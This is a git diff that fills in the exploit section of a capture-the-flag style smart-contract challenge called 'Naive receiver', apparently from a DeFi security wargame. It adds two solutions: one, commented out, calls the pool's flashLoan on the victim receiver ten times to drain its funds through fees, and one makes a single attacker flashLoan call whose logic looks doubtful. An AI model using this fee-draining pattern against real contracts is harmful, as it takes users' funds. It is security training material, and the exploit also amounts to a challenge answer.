@@ -30,7 +30,21 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        /** CODE YOUR EXPLOIT HERE */
+        // solution #1
+            // await this.pool.flashLoan(this.receiver.address, 10)
+            // await this.pool.flashLoan(this.receiver.address, 10)
+            // await this.pool.flashLoan(this.receiver.address, 10)
+            // await this.pool.flashLoan(this.receiver.address, 10)
+            // await this.pool.flashLoan(this.receiver.address, 10)
+            // await this.pool.flashLoan(this.receiver.address, 10)
+            // await this.pool.flashLoan(this.receiver.address, 10)
+            // await this.pool.flashLoan(this.receiver.address, 10)
+            // await this.pool.flashLoan(this.receiver.address, 10)
+            // await this.pool.flashLoan(this.receiver.address, 10)
+        
+        // solution #2
+            await this.pool.connect(attacker).flashLoan(this.receiver.address, 0, {value: 9})
     });
 
     after(async function () {
